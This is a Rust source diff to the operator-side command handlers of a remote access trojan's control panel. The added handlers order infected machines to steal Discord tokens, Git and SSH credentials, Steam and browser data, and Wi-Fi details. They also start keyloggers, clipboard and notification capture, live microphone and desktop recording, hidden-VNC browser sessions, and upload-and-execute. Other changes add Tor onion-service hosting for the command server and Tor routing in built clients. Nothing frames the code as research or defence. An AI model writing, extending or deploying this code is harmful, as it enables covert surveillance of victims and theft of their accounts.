@@ -1,9 +1,12 @@
 use crate::handlers::{AssemblyInfo, SharedTauriState};
 use crate::utils::logger::Log;
+use crate::utils::resources::{get_client_built_exe_path, get_exe_dir, get_rcedit_path};
 use base64::{engine::general_purpose, Engine as _};
 use serde::Serialize;
 use std::fs;
-use tauri::{State, Emitter};
+use std::process::Command;
+use std::sync::Arc;
+use tauri::{Emitter, State};
 
 use crate::client::ClientWrapper;
 use crate::commands::ServerCommand;
@@ -12,23 +15,22 @@ use tokio::net::TcpListener;
 use tokio::sync::mpsc;
 use tokio::sync::mpsc::Sender;
 
+use common::packets::TrollCommand;
 use std::ptr::null_mut as NULL;
 use winapi::um::winuser;
-use common::packets::TrollCommand;
 
 use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
 use crate::utils::client_builder::{apply_config, apply_rcedit, open_explorer};
-use common::packets::{
-    KeyboardInputData, MessageBoxData, MouseClickData, Process, RemoteDesktopConfig,
-    VisitWebsiteData, FileData
-};
 use common::client_info::ClientInfo;
-use crate::utils::resources::{get_rcedit_path, get_client_built_exe_path};
+use common::packets::{
+    FileData, KeyboardInputData, MessageBoxData, MouseClickData, Process, RemoteDesktopConfig,
+    VisitWebsiteData,
+};
 
-use std::process::Command;
+use crate::utils::tor::{OnionServiceInfo, TorManager};
 
 pub async fn get_channel_tx(
     tauri_state: State<'_, SharedTauriState>,
@@ -210,6 +212,8 @@ pub async fn build_client(
     group: &str,
     enable_hidden: bool,
     anti_vm_detection: bool,
+    use_tor: bool,
+    tor_address: &str,
     app_handle: AppHandle,
 ) -> Result<String, String> {
     let log = Log {
@@ -232,6 +236,8 @@ pub async fn build_client(
         install_folder: install_folder.to_string(),
         enable_hidden,
         anti_vm_detection,
+        use_tor,
+        tor_address: tor_address.to_string(),
     };
 
     apply_config(&config).await?;
@@ -392,6 +398,374 @@ pub async fn stop_remote_desktop(
 }
 
 #[tauri::command]
+pub async fn start_remote_desktop_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartRemoteDesktopAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Remote desktop audio started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_remote_desktop_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopRemoteDesktopAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Remote desktop audio stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn request_mic_devices(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::RequestMicDevices(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Mic devices requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_discord_tokens(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    println!("Tauri handler request_discord_tokens called for {}", addr);
+    send_server_command(
+        ServerCommand::RequestDiscordTokens(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Discord token extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_wifi_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetWifiData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("WiFi inventory requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_software_inventory(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSoftwareInventory(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Software inventory requested".to_string())
+}
+
+#[tauri::command]
+pub async fn launch_software(
+    addr: &str,
+    name: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::LaunchSoftware(addr.parse().unwrap(), name.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Software launch requested".to_string())
+}
+
+#[tauri::command]
+pub async fn uninstall_software(
+    addr: &str,
+    name: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::UninstallSoftware(addr.parse().unwrap(), name.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Software uninstall requested".to_string())
+}
+
+#[tauri::command]
+pub async fn get_software_icon(
+    addr: &str,
+    name: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSoftwareIcon(addr.parse().unwrap(), name.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Software icon requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_git_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetGitData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Git credential extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_ssh_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSSHData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("SSH data extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn request_steam_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetSteamData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Steam data extraction requested".to_string())
+}
+
+#[tauri::command]
+pub async fn start_clipboard_monitor(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartClipboardMonitor(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Clipboard monitor started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_clipboard_monitor(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopClipboardMonitor(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Clipboard monitor stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn start_notification_capture(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartNotificationCapture(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Notification capture started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_notification_capture(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopNotificationCapture(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Notification capture stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn start_mic_live(
+    addr: &str,
+    device_id: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartMicLive(addr.parse().unwrap(), device_id.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Mic live started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_mic_live(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopMicLive(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Mic live stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn start_mic_recording(
+    addr: &str,
+    device_id: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartMicRecording(addr.parse().unwrap(), device_id.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Mic recording started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_mic_recording(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopMicRecording(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Mic recording stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn start_desktop_recording(
+    addr: &str,
+    display: i32,
+    quality: u8,
+    fps: u8,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartDesktopRecording(
+            addr.parse().unwrap(),
+            RemoteDesktopConfig {
+                display,
+                quality,
+                fps,
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Desktop recording started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_desktop_recording(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopDesktopRecording(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Desktop recording stopped".to_string())
+}
+
+#[tauri::command]
 pub async fn send_mouse_click(
     addr: &str,
     display: i32,
@@ -527,7 +901,6 @@ pub async fn send_inputbox(
 
     Ok("Inputbox sent".to_string())
 }
-
 
 #[tauri::command]
 pub async fn elevate_client(
@@ -950,9 +1323,65 @@ pub async fn manage_hvnc(
             )
             .await?
         }
+        "open_chrome" => {
+            send_server_command(
+                ServerCommand::OpenHVNCProcess(addr.parse().unwrap(), "chrome.exe".to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "open_firefox" => {
+            send_server_command(
+                ServerCommand::OpenHVNCProcess(addr.parse().unwrap(), "firefox.exe".to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "open_edge" => {
+            send_server_command(
+                ServerCommand::OpenHVNCProcess(addr.parse().unwrap(), "msedge.exe".to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
     Ok("HVNC command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn start_hvnc_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartHVNCFrameAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("HVNC audio started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_hvnc_audio(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopHVNCFrameAudio(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("HVNC audio stopped".to_string())
 }
 
 #[tauri::command]
@@ -960,22 +1389,26 @@ pub async fn upload_and_execute(
     addr: &str,
     file_path: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    let file_data = fs::read(file_path)
-        .map_err(|e| format!("Failed to read file: {}", e))?;
-    
+    let file_data = fs::read(file_path).map_err(|e| format!("Failed to read file: {}", e))?;
+
     let file_name = std::path::Path::new(file_path)
         .file_name()
         .and_then(|name| name.to_str())
         .unwrap_or("unknown.exe");
-    
+
     let file_data = FileData {
         name: file_name.to_string(),
         data: file_data,
     };
-    
-    send_server_command(ServerCommand::UploadAndExecute(addr.parse().unwrap(), file_data), tauri_state, app_handle).await?;
+
+    send_server_command(
+        ServerCommand::UploadAndExecute(addr.parse().unwrap(), file_data),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Upload and execute command sent".to_string())
 }
@@ -985,17 +1418,21 @@ pub async fn execute_file(
     addr: &str,
     file_path: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::ExecuteFile(addr.parse().unwrap(), file_path.to_string()), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::ExecuteFile(addr.parse().unwrap(), file_path.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Execute file command sent".to_string())
 }
 
 #[tauri::command]
 pub async fn read_file_for_upload(file_path: &str) -> Result<Vec<u8>, String> {
-    fs::read(file_path)
-        .map_err(|e| format!("Failed to read file: {}", e))
+    fs::read(file_path).map_err(|e| format!("Failed to read file: {}", e))
 }
 
 #[tauri::command]
@@ -1005,16 +1442,163 @@ pub async fn upload_file_to_folder(
     file_name: &str,
     file_data: Vec<u8>,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
     let file_data = FileData {
         name: file_name.to_string(),
         data: file_data,
     };
-    
-    send_server_command(ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data), tauri_state, app_handle).await?;
+
+    send_server_command(
+        ServerCommand::UploadFile(addr.parse().unwrap(), target_folder.to_string(), file_data),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("File upload command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn init_tor(
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<Vec<OnionServiceInfo>, String> {
+    // Fast path
+    {
+        let state = tauri_state.0.lock().unwrap();
+        if let Some(manager) = &state.tor_manager {
+            return Ok(manager.get_services());
+        }
+    }
+
+    // Get the current server port if the server is running
+    let server_port = {
+        let state = tauri_state.0.lock().unwrap();
+        if state.running {
+            state.port.parse::<u16>().ok()
+        } else {
+            None
+        }
+    };
+
+    // Slow path
+    let exe_dir = get_exe_dir()?;
+    let tor_dir = exe_dir.join("tor_data");
+    let manager = Arc::new(
+        TorManager::new(tor_dir, &app_handle, server_port)
+            .await
+            .map_err(|e| e.to_string())?,
+    );
+
+    {
+        let mut state = tauri_state.0.lock().unwrap();
+        state.tor_manager = Some(manager.clone());
+    }
+
+    Ok(manager.get_services())
+}
+
+#[tauri::command]
+pub async fn create_onion(
+    nickname: String,
+    port: u16,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<OnionServiceInfo, String> {
+    let (manager, server_port, is_running) = {
+        let state = tauri_state.0.lock().unwrap();
+        let manager = state
+            .tor_manager
+            .clone()
+            .ok_or("Tor manager not initialized")?;
+        let server_port = state.port.parse::<u16>().unwrap_or(1337);
+        let is_running = state.running;
+        (manager, server_port, is_running)
+    };
+
+    // Warn if server is not running
+    if !is_running {
+        return Err("Server is not running. Start the server before creating an onion service.".to_string());
+    }
+
+    // Use the server's actual port instead of the user-provided port
+    // This ensures the onion service forwards to where the server is listening
+    let actual_port = server_port;
+    if port != actual_port {
+        println!(
+            "[TorManager] Note: Using server's listening port {} instead of requested port {}",
+            actual_port, port
+        );
+    }
+
+    manager
+        .create_onion_service(&nickname, actual_port, &app_handle)
+        .await
+        .map_err(|e| e.to_string())
+}
+
+#[tauri::command]
+pub async fn delete_onion(
+    nickname: String,
+    tauri_state: State<'_, SharedTauriState>,
+) -> Result<(), String> {
+    let manager = {
+        let state = tauri_state.0.lock().unwrap();
+        state
+            .tor_manager
+            .clone()
+            .ok_or("Tor manager not initialized")?
+    };
+
+    manager
+        .delete_onion_service(&nickname)
+        .await
+        .map_err(|e| e.to_string())
+}
+
+/// Probe whether an onion service is reachable on the Tor network.
+///
+/// Opens a fresh Tor circuit to `onion_address:port` using the already-bootstrapped
+/// TorClient held by TorManager, then immediately closes it.  Returns the round-trip
+/// latency in milliseconds on success, or an error string on failure.
+///
+/// This is intentionally separate from the arti status-event stream: arti reports
+/// "Running" as soon as the descriptor is *published*, but the service may not yet
+/// be reachable by other Tor clients.  This command performs an actual end-to-end
+/// probe so the UI can show confirmed reachability.
+#[tauri::command]
+pub async fn check_onion_reachability(
+    onion_address: String,
+    port: u16,
+    tauri_state: State<'_, SharedTauriState>,
+) -> Result<u64, String> {
+    use arti_client::{StreamPrefs};
+    use arti_client::config::BoolOrAuto;
+    use std::time::Instant;
+
+    // Borrow the already-bootstrapped TorClient from TorManager so we don't
+    // need to bootstrap a second time (which would take ~30 s).
+    let client = {
+        let state = tauri_state.0.lock().unwrap();
+        state
+            .tor_manager
+            .as_ref()
+            .ok_or("Tor manager not initialized — call init_tor first")?
+            .get_tor_client()
+    };
+
+    let mut prefs = StreamPrefs::new();
+    prefs.connect_to_onion_services(BoolOrAuto::Explicit(true));
+
+    let start = Instant::now();
+    let _stream = client
+        .connect_with_prefs((onion_address.as_str(), port), &prefs)
+        .await
+        .map_err(|e| format!("Reachability probe failed: {e}"))?;
+    let latency_ms = start.elapsed().as_millis() as u64;
+
+    Ok(latency_ms)
 }
 
 #[tauri::command]
@@ -1032,4 +1616,101 @@ pub async fn send_troll_command(
     .await?;
 
     Ok("Troll command sent".to_string())
+}
+
+#[tauri::command]
+pub async fn start_keylogger(
+    addr: &str,
+    realtime: bool,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartKeylogger(addr.parse().unwrap(), realtime),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Keylogger started".to_string())
+}
+
+#[tauri::command]
+pub async fn stop_keylogger(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopKeylogger(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Keylogger stopped".to_string())
+}
+
+#[tauri::command]
+pub async fn get_offline_logs(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetOfflineLogs(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Offline logs requested".to_string())
+}
+
+#[tauri::command]
+pub async fn clear_offline_logs(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::ClearOfflineLogs(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Offline logs cleared".to_string())
+}
+
+#[tauri::command]
+pub async fn get_browser_data(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::GetBrowserData(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Browser data requested".to_string())
+}
+
+#[tauri::command]
+pub async fn set_auto_upload_anonfiles(
+    enabled: bool,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::SetAutoUploadAnonFiles(enabled),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok(format!("Auto upload set to {}", enabled))
 }
